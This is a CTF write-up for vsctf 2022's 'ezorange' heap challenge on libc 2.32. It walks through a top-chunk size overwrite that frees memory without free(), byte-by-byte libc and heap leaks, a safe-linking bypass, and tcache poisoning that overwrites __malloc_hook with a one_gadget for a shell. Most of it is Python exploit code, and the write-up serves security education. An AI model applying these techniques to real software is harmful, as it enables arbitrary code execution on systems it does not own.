---
title: ezorange
readtime: true
date: 2022-07-10
tags: [tcache_poisoning,uaf,sysmalloc,top_chunk,pwn]
---

### Attachments : [ezorange](https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/ezorange) , [libc.so.6](https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/libc.so.6), [ld-2.32.so](https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/ld-2.32.so)
<br>
EzOrange was an interesting heap exploitation challenge from vsctf 2022. This challenge uses libc-2.32. There are two options, `Buy an orange` and `Modify part of orange`. The first option allows us to allocate chunks of size <= 0x1000 and index(Orange number) either 0 or 1. The second option asks for an index(Orange number) and a cell index, prints the byte present at the cell index and then reads a new value for it(that can be controlled by the user). Thus, we have an arbitrary read/ write primitive, one byte at a time. There's no function that would allow us to free a chunk. Let's create some helper functions for malloc, read and write


```py
def buy_orange(orange_number,size):
    p.sendlineafter("> ","1") 
    p.sendlineafter("Orange number: ",str(orange_number))
    p.sendlineafter("Size: ",str(size))

def modify_orange(orange_number,cell_index,value):
    p.sendlineafter("> ","2")
    p.sendlineafter("Orange number: ",str(orange_number))
    p.sendlineafter("Cell index: ",str(cell_index))
    p.sendlineafter("New value: ",str(value))

def leak_byte(orange_number,cell_index):
    p.sendlineafter("> ","2")
    p.sendlineafter("Orange number: ",str(orange_number))
    p.sendlineafter("Cell index: ",str(cell_index))
    p.recvuntil("Current value: ")
    leak = p.recvline()[:-1]
    p.sendlineafter("New value: ",leak)
    return leak

```
Alright, after writing a few helper functions, our goal is to generate a libc leak. This can be done by inserting a chunk into the unsorted bin and then reading the fd or bk, one byte at a time. But, wait a minute, there's no such functionality present in the binary that allows us to free a chunk. So, how do we insert a chunk into the unsorted bin if we can't free it? Well, in this case we can indirectly free a chunk by overwriting the `SIZE` field of the top chunk with a small value followed by large allocations. Whenever `malloc` receives a request that is too large to be serviced by an arena's top chunk or bins, the normal arenas handle it by changing permissions on the pre-mapped heap memory but the main arena invokes the `brk` system call to request memory from the kernel after which `malloc` checks the `SIZE` field to find out whether the newly allocated memory is contiguous to the heap or not. If it is, `malloc` extends the size of the top chunk. If the `SIZE` of the top chunk is overwritten with a small value and a large request to `malloc` is made, `malloc` finds out that the new memory doesn't border the end of the heap because of the fake size field of the top chunk. Since the newly allocated memory is larger, `malloc` starts a new heap right there by freeing the previous top chunk and moving the top chunk pointer to the newly allocated memory. Internally, the `sysmalloc` function is called. But, you cannot overwrite the top_chunk `SIZE` field with any value, there's a check involved in it.

```c
static void * sysmalloc (INTERNAL_SIZE_T nb, mstate av)
{
.....
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));
.....
}
```
The `PREV_INUSE` bit of the top chunk must be set and the chunk should end on a page boundary. 

Alright, so let's start the attack by allocating a chunk
```
buy_orange(0,24)
```
<img  src="https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/images/img1.png"/>

Now, we need to overwrite the `SIZE` of the top chunk with the value `0xd51` followed by a large request. This would free the top chunk and insert it into the unsorted bin. 
```py
value = 0xd51
modify_orange(0,24,value&0xff)
modify_orange(0,25,value>>8)
modify_orange(0,26,0)
buy_orange(1,3500)
```
After that, we can leak data from the free chunk, one byte at a time to get a libc leak.

```py
libc_leak = b'\x00'
for i in range(33,40):
    leak = leak_byte(0,i)
    leak = int(leak)
    libc_leak += p8(leak)
leak = u64(libc_leak)
libc.address = leak-0x1c5c00
log.critical("Libc base: {}".format(hex(libc.address)))
```
Now, after getting the libc base address, we'll try overwriting `__malloc_hook` with `one_gadget`. This can be done by inserting chunks into the tcache and corrupting the `fd`.
```
# Let's remove the chunk from the unsorted bin
buy_orange(0,0xd28)
buy_orange(0,0x10)
```
We can again overwrite the `SIZE` field of the top chunk and make large allocations to insert a chunk into the tcache. So, let's overwrite the `SIZE` of the top chunk with 0x221 and make a large request to free a chunk and insert into the tcache.

<img src="https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/images/img2.png"/>

```py
value = 0x221
modify_orange(0,24,value&0xff)
modify_orange(0,25,value>>8)
modify_orange(0,26,0)
buy_orange(1,3500)
```

<img src="https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/images/img3.png"/>
Alright, so we've successfully inserted a chunk into the tcache. Now, the only thing that's left is to overwrite `__malloc_hook` with `one_gadget`. 
Let's leak the `fd` field from the free chunk. 

```py
heap_leak1 = b''

for i in range(0x20,0x28):
    leak = leak_byte(0,i)
    leak = int(leak)
    heap_leak1 += p8(leak)
heap_leak1 = heap_leak1.ljust(8,b'\x00')
heap_leak1 = u64(heap_leak1)

```
libc2.32 has a check on the count fields in tcache. This can be bypassed by inserting one more chunk into the tcache , which would increase the count field of that particular tcache bin to 2. After that, we can corrupt the `fd` of the most recently freed chunk.

```py
buy_orange(0,0x10)
value = 0x221
modify_orange(0,24,value&0xff)
modify_orange(0,25,value>>8)
modify_orange(0,26,0)
buy_orange(1,3500)

heap_leak1 += 0x22
```
Now, libc2.32 includes an exploit mitigation known as [safe linking](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/). Basically, it obfuscates the `fd` of chunks that belong to bins that are singly linked.
In order to insert the `__malloc_hook` into the free list, we'll need to xor it with the heap leak.

```py
__malloc_hook = __malloc_hook ^ heap_leak1
__malloc_hook = p64(__malloc_hook)
```
Now, we're all set. Let's launch tcache poisoning.
```
for i in range(0x20,0x28):
    modify_orange(0,i,__malloc_hook[i-0x20])
```

So, we've successfully inserted the `__malloc_hook` into the free list. Let's grab it.
<img src="https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/images/img4.png">

```py
buy_orange(0,0x1f8)
buy_orange(0,0x1f8)
one_gadget = libc.address + 0xceb71
one_gadget = p64(one_gadget)
```
Overwrite `__malloc_hook` with `one_gadget` and call `malloc` to drop a shell
```py
for i in range(0,8):
    modify_orange(0,i,one_gadget[i])
buy_orange(0,0x10)
```
<img  src="https://github.com/0xSh4dy/ctf_writeups/raw/master/vsctf2022/EzOrange/images/img5.png">

### Complete exploit can be found [here](https://github.com/0xSh4dy/ctf_writeups/blob/master/vsctf2022/EzOrange/ezorange.py)